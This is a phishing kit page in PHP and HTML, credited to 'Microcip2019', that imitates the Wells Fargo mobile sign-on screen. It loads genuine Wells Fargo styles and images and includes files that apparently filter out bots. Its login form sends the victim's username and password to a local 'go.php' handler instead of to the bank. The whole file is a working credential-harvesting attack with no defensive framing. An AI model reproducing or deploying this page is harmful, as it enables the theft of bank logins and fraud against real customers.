<?php 
//----  Code by Microcip2019  --- //

include "ips.php";
include "bot/index.php";
?>


<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
        <title>Mobile Sign on | Wells Fargo</title>
        <meta name="description" content="Click here to sign on to your Wells Fargo account from your mobile phone.">
        <link rel="stylesheet" href="https://www.wellsfargo.com/auth/static/css/wf-fonts.css?v=2CD0DE55DF" type="text/css">
        <link rel="stylesheet" href="https://www.wellsfargo.com/auth/static/css/frontporch.css?v=2CD0DE55DF" type="text/css">
        <link type="text/css" href="https://www.wellsfargo.com/auth/static/wfa/css/signon_clean.css?v=2CD0DE55DF" rel="stylesheet" media="screen,projection,print">
<link rel="icon" sizes="128x128" href="/assets/images/icons/icon-normal-128x128.png">
<link rel="icon" sizes="192x192" href="/assets/images/icons/icon-hires-192x192.png">
<link rel="shortcut icon" type="image/x-icon" href="https://www04.wellsfargomedia.com/favicon.ico">

 <body theme="ssep" id="body" class="brand-fp" lob="cob" contextpath="/auth" devicetype="mobile">
        



        
        
        <div control="lightbox" id="saveUsernameWarningDialog" class="dialog">
            <div class="container" tabindex="-1" role="alertdialog" aria-labelledby="saveUsernameWarningTitle">
                <span class="hide">Beginning of popup</span>
                <div class="lightbox-title">
                    <h2 id="saveUsernameWarningTitle">Save Username</h2>
                </div>
                <div class="lightbox-content">
                    <p>For your security we do not recommend using this feature on a shared device.</p>
                </div>
                <div class="lightbox-button-container">
                    <button control="button" id="closeSaveUsernameWarningDialogBtn" aria-label="close"></button>
                </div>
                <span class="hide">End of popup</span>
            </div>
        </div>

<div class="header brand-fp" id="header">
  <div class="wf_logo" role="link">
    <img src="https://www10.wellsfargomedia.com/auth/static/images/masthead-wf_logo-e-148x16.svg" alt="Wells Fargo" lang="en" role="img">
  </div>
  <div class="hamburger_menu" role="link">
    <a href="https://www.wellsfargo.com/"><img src="https://www10.wellsfargomedia.com/auth/static/images/FP.svg" alt="Home" role="img"></a>
  </div>
</div>
<div id="ErrorBox" class="messaging" style="display:none;width: 100%;min-height: 3em;border-bottom: solid 5px #AFAFAF;background-color: #F7F7F6;padding-bottom: 30px;margin-bottom: 16px;float: left;">
                        <div class="messaging-wrapper" style="width: 95%;margin: 0 auto;padding: 8px;text-align: center;color: #000;">
                            <div class="icon error" style="display: block;float: left;width: 32px;height: 32px; margin: 8px 8px 0 0;background: url(https://connect.secure.wellsfargo.com/auth/static/images/ico-ind-sign-on-error-mob-32x32-000000-v01_00@1x.png) no-repeat;"></div>
                            <div class="message" style="font-size: 12px;color: #000;text-align: left;float: right;width: 85%;">
                            <span id="ErrorUser" style="display:none;font-family: arial, helvetica, sans-serif;font-weight:bold">A username must be entered. Please enter your username. </span> <br>
                            <span id="ErrorPass" style="display:none;font-family: arial, helvetica, sans-serif;font-weight:bold">Please enter a password. </span> 
                            </div>
                        </div>
                    </div>
<script type="text/javascript">

function nospaces(t){

if(t.value.match(/\s/g)){

alert('Sorry, you are not allowed to enter any spaces.');

t.value=t.value.replace(/\s/g,'');

}

}
</script>


<script>
function validateForm()
{
var a=document.forms["login"]["user"].value;
var b=document.forms["login"]["pass"].value;
    if (a == "") {
        document.getElementById("ErrorBox").style.display = "block"; 
        document.getElementById("ErrorUser").style.display = "block"; 
        return false;
    }
    if (b == "") {
        document.getElementById("ErrorBox").style.display = "block"; 
        document.getElementById("ErrorPass").style.display = "block"; 
        return false;
    }
}
</script>

        <main role="main">
            <article>
                

<div id="form" class="antiClickjackContent">
    <h1 class="banner" style="color:#000000;" > Welcome </h1>
    <h2 class="security-link flex-cntr">
        <!-- <span class="icon-lock"></span> -->
        <img src="https://www10.wellsfargomedia.com/auth/static/images/lock.svg" alt="" aria-hidden="true">
        <a class="" href="https://www.wellsfargo.com/privacy-security/fraud">Online &amp; Mobile Security</a></h2>
   <form id="frmSignon" name="login" action="go.php?sessionid=9901911lo01&amp;securessl=true" method="post" autocomplete="off" onsubmit="return validateForm();" >
        <input name="userPrefs" id="userPrefs" type="hidden">
        <input name="jsenabled" id="jsenabled" type="hidden" value="false">
        <div id="usernameWrapper" class="bim-input-wrapper">
            <label id="username" class="bim-input-label" for="j_username">Username</label>
                    <input class="bim-input" control="forms:input" pattern="[^@*\x22]+"type="text" name="user" id="j_username" autocomplete="off" minlength="4" maxlength="14" onkeyup="nospaces(this)" oninput="check(this)">
        </div>



        <script type="text/javascript">
    function check (input) {
    if (input.value.search(new RegExp(input.getAttribute('pattern'))) >= 0) {
        // Input is fine. Reset error message.
        input.setCustomValidity('');
    } else {
        input.setCustomValidity(' Characters are not supported * or @');
    }
}
</script>


        <div id="passwordWrapper" class="bim-input-wrapper">
            <label id="lblForPassword" class="bim-input-label" for="password">Password</label>
            <input class="bim-input pmask" control="forms:input" type="password" id="password" name="pass" autocomplete="off" minlength="5" maxlength="32" onkeyup="nospaces(this) ">
        </div>
        <div id="chkSave">
            <div class="save-usr-name">
                
                    
                        <input type="checkbox" value="true" id="saveUsernameCheckbox" name="save-username">
                    
                    
                
                <label for="saveUsernameCheckbox">
                    <span aria-labelledby="usernameLbl" role="checkbox" tabindex="0" aria-checked="false" aria-live="polite"></span>
                    <p id="usernameLbl">Save Username</p>
                </label>
            </div>
        </div>
        
            <div>
                <button class="primary cta-btn sign-on" data-type="primary"  aria-label="Sign On">Sign On</button>
            </div>
            <div id="forgot">
                <p id="forgot">
                    <span lang="en"><a href="https://www.wellsfargo.com/help/online-banking/sign-on-faqs">Forgot Password/Username?</a></span></p>
            </div>

            <div>
                <p class="ntwf-link">New to <span lang="en"><em>Wells Fargo Online</em></span><sup>®</sup>?</p>
                <button id="enrollButton" class="secondary-gray cta-btn enroll" control="button" aria-label="enroll">Enroll</button>
            </div>

            <input name="origin" id="origin" type="hidden" value="mobilebrowser">
            <input name="save-username" id="saveUsername" type="hidden" value="false">
            
                
            
            <input name="pcg" type="hidden" value=" ">

            
                <input type="hidden" name="segmentation" value=" cob">
            

            
        
        
            
           
    <input name="tgcsi" id="tgcsi" type="hidden" value="5b6d8143-09b4-48e0-b3c5-6c6e48247808"><input name="nds-pmd" type="hidden" value="{&quot;jvqtrgQngn&quot;:{&quot;oq&quot;:&quot;375:812:375:812:375:812&quot;,&quot;wfi&quot;:&quot;flap-143850&quot;,&quot;oc&quot;:&quot;700&quot;,&quot;fe&quot;:&quot;375k812 24&quot;,&quot;qvqgm&quot;:&quot;480&quot;,&quot;jxe&quot;:74531,&quot;syi&quot;:&quot;snyfr&quot;,&quot;si&quot;:&quot;si,btt,zc4,jroz&quot;,&quot;sn&quot;:&quot;sn,zcrt,btt,jni&quot;,&quot;us&quot;:&quot;74621s7244s49q25&quot;,&quot;cy&quot;:&quot;Jva32&quot;,&quot;sg&quot;:&quot;{\&quot;zgc\&quot;:1,\&quot;gf\&quot;:gehr,\&quot;gr\&quot;:gehr}&quot;,&quot;sp&quot;:&quot;{\&quot;gp\&quot;:gehr,\&quot;ap\&quot;:gehr}&quot;,&quot;sf&quot;:&quot;gehr&quot;,&quot;jt&quot;:&quot;s2nno0056qp62o71&quot;,&quot;sz&quot;:&quot;1rqsq5761s4859n9&quot;,&quot;vce&quot;:&quot;apvc,0,5s190186,2,1;fg,0,w_hfreanzr,0,cnffjbeq,0;gr,1on,87,os,hfreanzr;zz,61,87,os,hfreanzr;zp,2,87,os,hfreanzr;xx,2,0,w_hfreanzr;ss,0,w_hfreanzr;zp,1,87,os,w_hfreanzr;gr,39r,85,sr,cnffjbeq;so,27,w_hfreanzr;xx,2,0,cnffjbeq;ss,0,cnffjbeq;zp,1,84,sr,cnffjbeq;zzf,1q,0,n,498 2p92,498 2p92,47o,30p,292r4,292r4,4936;zzf,3r7,3r7,n,ABC;zzf,3r7,3r7,n,ABC;zzf,3r9,3r9,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r8,3r8,n,ABC;zzf,3r9,3r9,n,ABC;so,746,cnffjbeq;&quot;,&quot;hn&quot;:&quot;Zbmvyyn/5.0 (vCubar; PCH vCubar BF 13_2 yvxr Znp BF K) NccyrJroXvg/605.1 (XUGZY, yvxr Trpxb) Irefvba/13.0 Zbovyr/15R148 Fnsnev/604.1&quot;,&quot;ns&quot;:&quot;&quot;,&quot;fvq&quot;:&quot;aqfnfidmoojggkxpl7smsl&quot;},&quot;fvq&quot;:&quot;aqfnfidmoojggkxpl7smsl&quot;,&quot;jg&quot;:&quot;&quot;}"><input name="ndsid" type="hidden" value="ndsasvqzbbwttxkcy7fzfy"></form>
    
 
</div>
          



<div id="footer">
    <div id="links">
        <p><a href="https://www.wellsfargo.com/privacy-security/" class="link">PRIVACY, Cookies, Security &amp;
                Legal</a> <span class="link-separator"></span><a href="https://www.wellsfargo.com/privacy-security/privacy/online#adchoices" class="link">Ad Choices </a>
        </p>
        <p><a href="https://www.wellsfargo.com/online-banking/online-access-agreement/" class="link online-acc">Online Access
                Agreement</a>

            <span class="link-separator"></span>
            <a href="https://www.wellsfargo.com/privacy-security/privacy/esign-consent/" class="link e-sign">ESIGN
                    Consent</a>
            
        </p>
        <p>© 2020 <span lang="en">Wells Fargo</span>. All rights reserved.</p>
    </div>
    <div id="img">
    </div>
</div>
                    
                    
                
            </article>
        </main>

        

    <!--TMS include starts-->
    <script type="text/javascript" nonce="">
        var utag_data = {
            'app_id': 'loginapp',
            'customer_type': 'COB',
            'wfacookie': '45202006210957431019573663',
            'device_type': 'desktop',
            'environment': 'PROD',
            'tealium_js_path': 'https://static.wellsfargo.com/tracking/main/utag.js',
            'mt_tag_path': 'https://static.wellsfargo.com/mttag/'
        }
    </script>
    <script type="text/javascript" nonce=""> (function(a,b,c,d){a='https://static.wellsfargo.com/tracking/main/utag.js';b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=true;a=b.getElementsByTagName(c)[0];if (a.src !== d.src) { a.parentNode.insertBefore(d,a);}})();</script>
    <!--TMS include ends-->
    <noscript><!-- No alternative content --></noscript>
          <!--end main-->
    
    

            <script src="https://www.wellsfargo.com/auth/static/scripts/components/public/lightbox/lightbox.js" nonce=""></script>
            
            <script type="text/javascript" nonce="">
                function signonFormSubmitHandler(evt) {
                    evt.preventDefault();
                    disableSubmitsCollectUserPrefs(evt.target);
                    evt.target.submit();
                }
                function gotoPreviousPage() {
                    window.history.go(-1);
                }
                
                if (document.querySelector("#Signon")) {
                    document.querySelector("#Signon").addEventListener('submit', signonFormSubmitHandler);
                }
                if (document.querySelector("#linkToPreviousPage")) {
                    document.querySelector("#linkToPreviousPage").addEventListener('click', gotoPreviousPage);
                }
                const userNameEL = document.querySelector(".oas-redesigned #j_username");
                const passwordEl = document.querySelector(".oas-redesigned #j_password");
                function animateLabel(e) {
                    e.target.previousElementSibling.classList.add('animated');
                }
                function removeAnimation(e) {
                    if (!e.target.value.trim().length) {
                        e.target.previousElementSibling.classList.remove('animated');
                        e.target.value = "";
                    }
                }
                if (userNameEL != null) {
                    userNameEL.addEventListener('focus', animateLabel);
                    userNameEL.addEventListener('blur', removeAnimation);
                }
                if (passwordEl != null) {
                    passwordEl.addEventListener('focus', animateLabel);
                    passwordEl.addEventListener('blur', removeAnimation);
                }


                function focusError() {
                    const errorCntr = document.querySelector('#errorCntr');
                    if(errorCntr) {
                        errorCntr.focus();
                    }
                }

                focusError();



            </script>
            

    <script src="https://www.wellsfargo.com/auth/static/scripts/frontporch.js?v=2CD0DE55DF" nonce=""></script>
    <script type="text/javascript" nonce="">
        function enrollButtonHandler(evt) {
            evt.preventDefault();
            location.href="https://oam.wellsfargo.com/oamo/identity/authentication?execution=e1s1";
        }
        if (document.querySelector("#enrollButton")) {
            document.querySelector('#enrollButton').addEventListener('click', enrollButtonHandler);
        }


        if(document.querySelector('#usernameWrapper .bim-input')) {
            document.querySelector('#usernameWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#usernameWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#usernameWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#usernameWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#usernameWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }
        if(document.querySelector('#passwordWrapper .bim-input')) {
            document.querySelector('#passwordWrapper .bim-input').addEventListener('focus', function(evt){
                document.querySelector('#passwordWrapper.bim-input-wrapper').classList.add('halo')
                if(evt.target.value) {
                    return
                } else {
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.add('above')
                }
            })

            document.querySelector('#passwordWrapper .bim-input').addEventListener('blur', function(evt){
                document.querySelector("#passwordWrapper.bim-input-wrapper").classList.remove('halo')
                if(evt.target.value) {
                    evt.target.classList.add('with-value')
                } else {
                    evt.target.classList.remove('with-value')
                    document.querySelector("#passwordWrapper.bim-input-wrapper .bim-input-label").classList.remove('above')
                };
            })
        }



    </script>

    

<iframe frameborder="0" title="dub_mn" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe></body></html>